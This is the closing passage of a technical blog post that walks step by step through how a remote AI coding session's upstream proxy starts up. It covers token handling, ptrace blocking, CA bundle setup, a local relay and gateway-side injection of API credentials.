+<h2 id="the-complete-sequence">The Complete Sequence</h2>
+<p>Here’s the full initialization, end to end:</p>
+<ol>
+<li>
+<p><strong>Gate check</strong>: Verify <code>CLAUDE_CODE_REMOTE</code>, <code>CCR_UPSTREAM_PROXY_ENABLED</code>, session ID.</p>
+</li>
+<li>
+<p><strong>Read token</strong>: Load session token from <code>/run/ccr/session_token</code> (tmpfs).</p>
+</li>
+<li>
+<p><strong>Block ptrace</strong>: <code>prctl(PR_SET_DUMPABLE, 0)</code> via Bun FFI to libc.</p>
+</li>
+<li>
+<p><strong>Download CA</strong>: Fetch gateway CA from <code>/v1/code/upstreamproxy/ca-cert</code>, merge with system bundle, write to <code>~/.ccr/ca-bundle.crt</code>.</p>
+</li>
+<li>
+<p><strong>Start relay</strong>: Bind TCP server to <code>127.0.0.1:0</code>, get ephemeral port.</p>
+</li>
+<li>
+<p><strong>Unlink token</strong>: Delete token file from disk. Token is now heap-only.</p>
+</li>
+<li>
+<p><strong>Register env function</strong>: Wire <code>getUpstreamProxyEnv()</code> into <code>subprocessEnv()</code>.</p>
+</li>
+<li>
+<p><strong>Subprocess spawned</strong>: Model runs <code>curl https://api.datadog.com/v1/metrics</code>. The subprocess inherits <code>HTTPS_PROXY=http://127.0.0.1:&#x3C;port></code> and <code>SSL_CERT_FILE=~/.ccr/ca-bundle.crt</code>.</p>
+</li>
+<li>
+<p><strong>CONNECT request</strong>: curl sends <code>CONNECT api.datadog.com:443 HTTP/1.1</code> to the local relay.</p>
+</li>
+<li>
+<p><strong>WebSocket tunnel</strong>: Relay opens WebSocket to CCR gateway, forwards the CONNECT line with <code>Proxy-Authorization</code>.</p>
+</li>
+<li>
+<p><strong>Credential injection</strong>: Gateway MITMs the TLS connection, injects org-configured headers (e.g., <code>DD-API-KEY</code>), forwards to the real upstream.</p>
+</li>
+<li>
+<p><strong>Bidirectional relay</strong>: Bytes flow: curl ↔ TCP ↔ protobuf chunks ↔ WebSocket ↔ gateway ↔ Datadog API.</p>
+</li>
+</ol>
+<p>Each layer assumes the others might fail. The token lifecycle assumes ptrace might not be blockable. The CA download assumes the endpoint might be down. The relay assumes TCP packets might be coalesced. The protobuf encoder assumes payloads might exceed buffer caps. And the entire system assumes it might not initialize at all — in which case, the session works normally without proxy capabilities, and the debug log explains why.</p>  <div class="subscribe-cta" data-astro-cid-bvzihdzo> <p data-astro-cid-bvzihdzo>Get new posts delivered to your inbox</p> <a href="https://oldeucryptoboi.substack.com/subscribe" target="_blank" rel="noopener" data-astro-cid-bvzihdzo>Subscribe on Substack →</a> </div> <nav class="post-nav" data-astro-cid-bvzihdzo> <a class="nav-link nav-prev" href="/blog/ai-white-collar-great-recession/" data-astro-cid-bvzihdzo> <span class="nav-label" data-astro-cid-bvzihdzo>Previous</span> <span class="nav-title" data-astro-cid-bvzihdzo>94% Exposed, 30% Adopted: Why Engineering Leaders Need to Rethink How They Hire</span> </a> <a class="nav-link nav-next" href="/blog/tool-search-deep-dive/" data-astro-cid-bvzihdzo> <span class="nav-label" data-astro-cid-bvzihdzo>Next</span> <span class="nav-title" data-astro-cid-bvzihdzo>How Tool Search Defers Tools to Save Tokens</span> </a> </nav> </div> </article> </main> <footer data-astro-cid-sz7xmlte> <div class="footer-inner" data-astro-cid-sz7xmlte> <div class="status-line" data-astro-cid-sz7xmlte> <span class="hal-dot" data-astro-cid-sz7xmlte></span> <span data-astro-cid-sz7xmlte>OPERATIONAL</span> </div> <div class="copyright" data-astro-cid-sz7xmlte>
+&copy; 2026 Laurent DeSegur
+</div> <div class="social-links" data-astro-cid-sz7xmlte> <a href="https://x.com/oldeucryptoboi" target="_blank" data-astro-cid-sz7xmlte>X</a> <span class="sep" data-astro-cid-sz7xmlte>/</span> <a href="https://oldeucryptoboi.substack.com" target="_blank" data-astro-cid-sz7xmlte>Substack</a> <span class="sep" data-astro-cid-sz7xmlte>/</span> <a href="https://github.com/oldeucryptoboi" target="_blank" data-astro-cid-sz7xmlte>GitHub</a> </div> </div> </footer>  </body></html>
